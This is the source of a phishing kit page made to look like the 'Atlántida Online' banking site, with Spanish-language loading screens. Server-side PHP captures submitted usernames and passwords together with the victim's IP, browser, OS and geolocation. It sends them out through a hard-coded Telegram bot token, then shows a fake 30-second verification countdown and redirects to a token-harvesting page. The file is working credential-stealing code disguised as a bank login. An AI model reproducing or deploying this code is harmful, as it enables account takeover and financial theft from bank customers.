<?php  
include "fucker.php";
?>

<?php
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////
$user_agent = $_SERVER['HTTP_USER_AGENT'];
function getBrowser($user_agent){
if(strpos($user_agent, 'MSIE') !== FALSE)
   return 'Internet explorer';
 elseif(strpos($user_agent, 'Edge') !== FALSE) //Microsoft Edge
   return 'Microsoft Edge';
 elseif(strpos($user_agent, 'Trident') !== FALSE) //IE 11
    return 'Internet explorer';
 elseif(strpos($user_agent, 'Opera Mini') !== FALSE)
   return "Opera Mini";
 elseif(strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR') !== FALSE)
   return "Opera";
 elseif(strpos($user_agent, 'Firefox') !== FALSE)
   return 'Mozilla Firefox';
 elseif(strpos($user_agent, 'Chrome') !== FALSE)
   return 'Google Chrome';
 elseif(strpos($user_agent, 'Safari') !== FALSE)
   return "Safari";
 else
   return 'No navegador';}
 function getOS() { 
    global $user_agent;
    $os_array =  array(
     '/windows nt 10/i'      =>  'Windows 10',
     '/windows nt 6.3/i'     =>  'Windows 8.1',
     '/windows nt 6.2/i'     =>  'Windows 8',
     '/windows nt 6.1/i'     =>  'Windows 7',
     '/windows nt 6.0/i'     =>  'Windows Vista',
     '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
     '/windows nt 5.1/i'     =>  'Windows XP',
     '/windows xp/i'         =>  'Windows XP',
     '/macintosh|mac os x/i' =>  'Mac OS X',
     '/mac_powerpc/i'        =>  'Mac OS 9',
     '/linux/i'              =>  'Linux',
     '/ubuntu/i'             =>  'Ubuntu',
     '/iphone/i'             =>  'iPhone',
     '/ipod/i'               =>  'iPod',
     '/ipad/i'               =>  'iPad',
     '/android/i'            =>  'Android',
     '/blackberry/i'         =>  'BlackBerry',
     '/webos/i'              =>  'Mobile');
    $os_platform = "Unknown OS Platform";
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value; }  }
    return $os_platform; }
$user_os        =   getOS();
$navegador = getBrowser($user_agent);

@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];
@$ciudad = $meta['geoplugin_city'];
date_default_timezone_set('America/Bogota');


////////////////////

@ini_set("display_errors", 0);

////////////////////
if ( isset ($_POST['uz3r']) && isset ($_POST['p4zz'])  ){


$message = "uzer: ".$_POST['uz3r']." - p4zz: ".$_POST['p4zz']."  \r\n";
$message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
$apiToken = "5830940342:AAFD-f94b1SfPAJnjOqi07f4rGhr-hGskos";


$data = [
  'chat_id' => '@printhost',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );




 }



?>
<html class="sap-phone sapUiTheme-base sap-android sapUiMedia-Std-Phone sapUiMedia-StdExt-Phone" dir="ltr" data-sap-ui-browser="cr90" data-sap-ui-os="Android11" lang="es" data-sap-ui-animation="on" data-sap-ui-animation-mode="full"><head>
        <title>Atlántida Online</title>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="format-detection" content="telephone=no">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
        
<link rel="stylesheet" href="css/custom.css" id="sap-ui-core-customcss" data-sap-ui-ready="true">
<link rel="stylesheet" type="text/css" href="css/preloader.css">
        
        
        <meta http-equiv="Content-Security-Policy" content="img-src 'self' blob: data:; script-src 'self' 'unsafe-inline' http//*.google.com http://*.googleapis.com https://www.gstatic.com http://maps.gstatic.com https://*.google.com https://*.googleapis.com https://maps.gstatic.com http://connect.facebook.net https://connect.facebook.net https://*.facebook.com https://*.firebaseio.com 'unsafe-eval'">
        <script type="text/javascript">
               var url="token.php";
               var seconds = 30; //número de segundos a contar
               function secondPassed() {
               
                 var minutes = Math.round((seconds - 30)/60); //calcula el número de minutos
                 var remainingSeconds = seconds % 60; //calcula los segundos
                 //si los segundos usan sólo un dígito, añadimos un cero a la izq
                 if (remainingSeconds < 10) { 
                   remainingSeconds = "0" + remainingSeconds; 
                 } 
                 document.getElementById('countdown').innerHTML = minutes + ":" +     remainingSeconds; 
                 if (seconds == 0) { 
                   clearInterval(countdownTimer); 
                  window.location=url;
                   document.getElementById('countdown').innerHTML = ""; 
                 } else { 
                   seconds--; 
                 } 
               } 
               
               var countdownTimer = setInterval(secondPassed, 1000);
            </script>
        
		
        <script type="text/javascript">
            //Global Constants
            var SAP_BANKING_MOBILE_ROOT = "index.html";
            try {
                if (window.localStorage) {
                    var scConSettings = window.localStorage.getItem(Logon.Connection.STORAGE_KEY);
                    if(scConSettings){
                        var oConSettings = JSON.parse(scConSettings);
                        AppConfig.ConnectionConfig.OFFLINE_MODE = oConSettings.offlineMode;
                        AppConfig.ConnectionConfig.SERVICE_CONTEXT = oConSettings.serviceContext;
                        AppConfig.AppType = oConSettings.appType;
                        AppConfig.ChannelType = oConSettings.channelType;
                        AppConfig.Theme = oConSettings.theme;
                        AppConfig.Language = oConSettings.language;
                    } else {
                        const initialLanguage = navigator.language;
                        const language = initialLanguage.split('-');
                        if ( language[0] === "en") {
                            AppConfig.Language = "en";
                        } else {
                            AppConfig.Language = "es";
                        }
                    }
                    
                }
            } catch (e) {
            }
            window["sap-ui-config"] = {
                language: AppConfig.Language,
                themeRoots: {
                    "bancoatlantida": "./themes/bancoatlantida/UI5",
                    "bancoatlantic": "./themes/bancoatlantic/UI5"
                }
            };
        </script>
        
        <style>
            @font-face {
                font-family: 'Material Icons';
                font-style: normal;
                font-weight: 400;
                src: url('themes/font/materialfont/MaterialIcons-Regular.eot');
                src: local('Material Icons'), local('MaterialIcons-Regular'),
                    url('themes/font/materialfont/MaterialIcons-Regular.woff2')
                    format('woff2'),
                    url('themes/font/materialfont/MaterialIcons-Regular.woff') format('woff'),
                    url('themes/font/materialfont/MaterialIcons-Regular.ttf')
                    format('truetype');
            }

            @font-face {
                font-family: 'batl';
                src:  url('fonts/batl-v24.eot?ligdfv');
                src:  url('fonts/batl-v24.eot?ligdfv#iefix') format('embedded-opentype'),
                    url('fonts/batl-v24.ttf?ligdfv') format('truetype'),
                    url('fonts/batl-v24.woff?ligdfv') format('woff'),
                    url('fonts/batl-v24.svg?ligdfv#batl') format('svg');
                font-weight: normal;
                font-style: normal;
                font-display: block;
            }
            @font-face {
                font-family: 'Neo Sans';
                src:  url('fonts/NeoSan.ttf');
                font-weight: normal;
                font-style: normal;
                font-display: block;
            }
            @font-face {
                font-family: 'Neo Sans Medium';
                src:  url('fonts/NeoSanMed.ttf');
                font-weight: normal;
                font-style: normal;
                font-display: block;
            }
        </style>
        
    </head>
    <body class="sapUiBody sapBgImg bancoUiBody" id="content">
        <div id="loadingDiv" class="ocbPreLoader">
            <div class="load-bar">
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
            </div>
            <div class="ocbPreLoaderContainer ocbPreLoaderAlignContentCenter">
                <div class="ocbPreLoaderAlignContentMiddle">
                    <div>
                        <img class="sapUiFormResGridCont sapUiRespGrid sapUiRespGridHSpace0 sapUiRespGridOverflowHidden sapUiRespGridVSpace0 sapUiRespGridMedia-Std-Phone" src="img/logo_banco_single_red_gradient.svg" style="height: 45px;"><br><h3 class="sapMPanelHdr" id="__panel0-header">Cargando...</h3><img class="ocbPreLoaderBackgroundImage" src="img/load.gif" style="height: 90px;"><br><h3 class="sapMPanelHdr" id="__panel0-header">Espere un momento<br>No cierre esta ventana</h3><strong id="time"><label id="countdown">30</label></strong>
<br><h3 class="sapMPanelHdr" id="__panel0-header">Estamos verificando sus datos.</h3>
                        <span class="ocbPreLoaderWelcomeText"></span>
                    </div>
                </div>
            </div>
        </div>
        <div class="mobileLandscapeModeNotSupportedOverlay" style="display:none">
            <span class="screenOffIcon">Gira tu dispositivo para continuar.</span>
            <span></span>
        </div>
        <div style="display: none" class="ocbNSPage ocbLoginPage"> 
        <script type="text/javascript">
            document.addEventListener('readystatechange', (event) => {
                if (event.target.readyState === 'interactive') {
                    var sDefaultTheme = AppConfig.Theme, sWelcomeText, sImageUrl, sTextColor;
                    
                    var lang = AppConfig.Language;
                    var screenTurnSpanishText = "Gira tu dispositivo para continuar.";
                    if(lang !== "en") {
                        document.querySelector('.screenOffIcon').textContent = screenTurnSpanishText;
                    }
                    
                    if(sDefaultTheme === "bancoatlantida") {
                        //sWelcomeText = (lang === "en") ? "Welcome to Atlántida Online" : "Bienvenido a Atlántida Online";
                        sImageUrl = "img/logo_banco_single_red_gradient.svg";
                        //sTextColor = "#b4282d";
                        //document.querySelector('.ocbPreLoaderWelcomeText').style.color = sTextColor;
                        //document.querySelector('.ocbPreLoaderWelcomeText').textContent = sWelcomeText;
                        document.querySelector('.ocbPreLoaderBackgroundImage').src = sImageUrl;
                        document.querySelector('.ocbPreLoaderBackgroundImage').style.height = '90px';
                    } else if(sDefaultTheme === "bancoatlantic"){
                        sWelcomeText = "Welcome to Atlántic Online";
                        sImageUrl = "img/atlantic_logo.ico";
                        sTextColor = "#346187";
                        document.querySelector('.ocbPreLoaderWelcomeText').style.color = sTextColor;
                        document.querySelector('.ocbPreLoaderWelcomeText').textContent = sWelcomeText;
                        document.querySelector('.ocbPreLoaderBackgroundImage').src = sImageUrl;
                    }
                }
            });
        </script>
        
        
        <div id="SamplePDF"></div>
    



</div></body></html>
